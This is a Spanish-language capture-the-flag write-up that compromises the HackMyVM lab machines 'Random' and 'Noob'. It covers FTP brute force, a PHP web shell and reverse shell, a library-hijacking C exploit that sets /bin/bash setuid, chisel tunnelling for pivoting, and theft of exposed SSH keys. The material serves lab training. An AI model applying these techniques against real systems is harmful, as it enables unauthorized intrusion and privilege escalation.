---
title: HackMyVm - Random & Noob (Pivoting)
published: true
---

---

> Laboratorio de la página []() 

### Enumeración

Con **netdiscover** escaneo la red para identificar dispositivos activos y saber la **IP** de la máquina dentro del rango de la interfaz eth0.

```bash
sudo netdiscover -i eth0 -r 192.168.1.0/24
```

![](https://eidd3.github.io/assets/img/randomnoob/gif.gif)

Con **nmap** escaneo los puertos para saber que servicios tiene la máquina.

![](https://eidd3.github.io/assets/img/)

![](https://eidd3.github.io/assets/img/)

* Puerto 80 - HTPP
* Puerto 22 - SSH
* Puerto 21 - FTP

Para un escaneo rapido de la web lanzo el script _http-enum_ de nmap para descubrir algunas rutas o archivos.

![](https://eidd3.github.io/assets/img/)

Pero no muestra ningun resultado.

trato de conectarme por **FTP** con el usuario _anonymous_ y sin contraseña y me deja pero no puedo ingresar al directorio **html**.

![](https://eidd3.github.io/assets/img/)

y si intento descargar el contenido creo que tampoco tengo los permisos para hacerlo.

![](https://eidd3.github.io/assets/img/)

La página web muestra un mensaje y 2 nombres de usuarios.

![](https://eidd3.github.io/assets/img/)

con **Hydra** intento fuerza bruta sobre el usuario **eleanor** para saber la contraseña.

![](https://eidd3.github.io/assets/img/)

Y la encuentra `eleanor:ladybug`

Si ahora intento descargar el contenido de el directorio **html** si me deja.

![](https://eidd3.github.io/assets/img/)

Y parece que la página web esta conectada con el servicio **FTP**.

Hago la prueba de tratar de subir un archivo.

![](https://eidd3.github.io/assets/img/)

Pero no me deja.

Desde aca probe fuerza bruta por ssh al usuario **alan**, enumerar la web buscando directorios y archivos **txt**,**php**,**html** pero no encontre nada.

Con la herramienta **sftp** intente subir un archivos y si me dejo.

![](https://eidd3.github.io/assets/img/)

![](https://eidd3.github.io/assets/img/)

> stfp es un programa de transferencia de archivos similar a ftp, el cual realiza todas las opreaciones a través de un transporte ssh cifrado.

Se ve que **FTP** tiene restringido los permisos de escritura o alguna configuracion similar.

Ahora cree el tipico on-liner en **PHP** para usar una web shell en la página y lo subi.

![](https://eidd3.github.io/assets/img/)

![](https://eidd3.github.io/assets/img/)

Teniendo ejecucion de comandos, entablo una reverse shell.

![](https://eidd3.github.io/assets/img/)

### www-data

El usuario **eleanor** no tenia acceso por ssh desde afuera, pero si pruebo desde la màquina usando la contraseña `ladybug` si me deja.

### root
#### Library Hijacking

Para elevar mis privilegios a root enumero los archivos que puedo ejecutar con los permisos del propietario.

![](https://eidd3.github.io/assets/img/)

Y el usuario **root** tiene un archivo ejecutable en el directorio de **alan**.
Si veo el resto de los archivos hay una **note.txt** que no puedo leer, un archivo de texto **root.h** que contiene: 

```
eleanor@random:/home/alan$ cat root.h 
void makemeroot();
```

y el archivo compilado **rooter.o** que al leerlo muestra:

```
eleanor@random:/home/alan$ cat rooter.o 
ELF>@@
NHH=]SUCCESS!! But I need to finish and implement this functionGCC: (Debian 8.3.0-6) 8.3.0zRAC

+rooter.cmakemeroot_GLOBAL_OFFSET_TABLE_puts

                                             .symtab.strtab.shstrtab.rela.text.data.bss.rodata.comment.note.GNU-stack.rela.eh_frame @@80
&SS1X90BWR@h
 
 	0aeleanor@random:/home/alan$ file rooter.o 
rooter.o: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), not stripped
```
Parece que la funcion `makemeroot` no esta implementada.

Si miro el archivo con _file_ veo que es un binario ejecutable de 64 bits, que al ejecutarlo se hace bajo el contexto de los privilegios del propietario y el grupo (root), ya que tiene **setuid** y **setgid** activos y que esta vinculado a librerias compartidas.

![](https://eidd3.github.io/assets/img/)

Esto ultimo lo hace vulnerable a **Library Hijacking**, ya que si se puede modificar desde que ruta carga las librerias se puede crear un codigo malicioso para que cuando se ejecute el programa como root, le cambie los permisos a la **bash** por ejemplo.

Si miro las librerias compartidas con **ldd**, veo que hace uso de _librooter.so_ y lo carga desde _/lib/librooter.so_ 

![](https://eidd3.github.io/assets/img/)

Para cambiar el orden de carga, tengo que ver si tengo permisos de escritura en **/etc/ld.so.conf.d** que es el directorio que contiene los archivos de configuracion para establecer la ruta de carga de las librerias.

Pero no puedo escribir en ese directorio.

Pero si miro en **/lib** que es de donde el binario **random** carga la libreria, si puedo escribir.

Entonces lo que tengo que hacer es crear un archivo en C que implemente la función **makemeroot()**. Así, cuando lo compile, se llamará **librooter.so**, que es la biblioteca que carga el binario **random**. De esta manera, podré obtener permisos setuid y ejecutar un shell como root.

_exploit.c_:
```C
#include <unistd.h>
#include <stdlib.h>

void makemeroot()
{
        setuid(0);
        setgid(0);
        system("chmod u+s /bin/bash");
}
```

```bash
/usr/bin/gcc -shared exploit.c -o librooter.so
```

![](https://eidd3.github.io/assets/img/)

![](https://eidd3.github.io/assets/img/)

>Para que se aplique el cambio a la bash tenia que ejecutar el binario con un numero hasta que se iguale al random, pero justo fue el 1 y no mostro el error de "Wrong number" xd 

## Pivoting

Si veo todas las ip asociadas al host veo una interfaz en la subred 10.10.0.0/24.

![](https://eidd3.github.io/assets/img/)

Para enumerar hosts dentro de esa subred puedo crear un script de bash.

```bash
for host in $(seq 0 254); do timeout 1 bash -c "ping -c 1 10.10.0.$host" &> /dev/null && echo -e "10.10.0.$host UP" & done; wait
```

```
bash-5.0# ./hosts.sh 
10.10.0.129 UP
10.10.0.130 UP
bash-5.0# 
```

Y el host con **IP 10.10.0.130** está activa.

Ahora para ver puertos abiertos, como la máquina no tiene **nmap** hago un one-liner de bash enumerar puertos abiertos.

![](https://eidd3.github.io/assets/img/)

* Puerto 22 
* Puerto 65530 

Para poder hacer un escaneo de esos puertos para ver informacion detallada uso [chisel](https://github.com/jpillora/chisel) para hacer **port forwarding**.

#### Chisel

> Chisel es una herramienta popular para realizar port forwarding y tunelización en redes, especialmente útil cuando se trabaja en entornos restringidos o de acceso limitado. Es una aplicación que permite tanto redirigir puertos locales a un servidor remoto como crear túneles reversos para acceder a recursos internos de una red remota

Para eso primero paso la herramienta **chisel** a la máquina **Random**.

![](https://eidd3.github.io/assets/img/)

### Remote port forwarding

Una opcion es hacer remote port forwarding para ir viendo puerto por puerto con los siguientes parametros

_Maquina Kali_:

```ruby
❯ ./chisel server --reverse -p 1234
2024/10/16 14:35:20 server: Reverse tunnelling enabled
2024/10/16 14:35:20 server: Listening on http://0.0.0.0:1234
```

_Maquina Random_:

```ruby
root@random:~# ./chisel client 192.168.1.34:1234 R:22:10.10.0.130:22
2024/10/16 14:37:14 client: Connecting to ws://192.168.1.34:1234
2024/10/16 14:37:14 client: Connected (Latency 1.924012ms)
```

Con esto estaria haciendo que mi puerto **22** (**192.168.1.34**) se convierta en el puerto **22** de la máquina **Noob** (**10.10.0.130**) a través de la maquina **Random** que actua como un intermediario.

![](https://eidd3.github.io/assets/img/)

Y lo mismo con el **65530**

![](https://eidd3.github.io/assets/img/)

Pero hacer la conexion puerto por puerto en caso de que sean varios puede ser tedioso.

### Socks

Otra forma de acceder a todo el trafico es con **socks**, que permite tunelizar la conexion por un proxy local y redirigier el trafico de la red interna de **Noob** a mi maquina.

_Maquina Kali_:

```ruby
❯ ./chisel server --reverse -p 1234
2024/10/16 15:57:35 server: Reverse tunnelling enabled
2024/10/16 15:57:35 server: Fingerprint t6Q2aEw5KvIprx+PfHQI8/n2GgtsLSU3tIvczuYhsX0=
2024/10/16 15:57:35 server: Listening on http://0.0.0.0:1234
2024/10/16 15:57:37 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```
_Maquina Random_:

```ruby
root@random:~# ./chisel client 192.168.1.34:1234 R:socks
2024/10/16 15:56:05 client: Connecting to ws://192.168.1.34:1234
2024/10/16 15:56:05 client: Connected (Latency 1.611766ms)
```

Ahora que tengo conectividad a traves del tunel creado, para poder interactuar con los puertos de la maquina **Noob** tengo que configurar las herramientas para poder hacerlo como **proxychains** para poder usar **nmap** y **foxy proxy** para poder acceder desde navegador.

![](https://eidd3.github.io/assets/img/)

![](https://eidd3.github.io/assets/img/)

### Noob

Con un escaneo a la web existe un archivo _index_ y un directorio _nt4share_.

![](https://eidd3.github.io/assets/img/)

Parece que es el directorio personal del usuario **nt4share**, y lo interesante es el directorio **.ssh**.

Si ingreso estan las claves `authorized_keys id_rsa id_rsa.pub`.

Al verlas se ve que el usuario **adela** existe en el sistema.

Me descargo `id_rsa` que es la clave privada y accedo por ssh.

![](https://eidd3.github.io/assets/img/)

Para elevar privilegios hay que crear un enlace simbolico que apunte al directorio /root y que va a poder ser accesible de la misma manera que el anterior, por la web.

![](https://eidd3.github.io/assets/img/)

![](https://eidd3.github.io/assets/img/)

Y ahora el mismo metodo anterior, descargar la id_rsa de root y acceder por ssh.

![](https://eidd3.github.io/assets/img/)

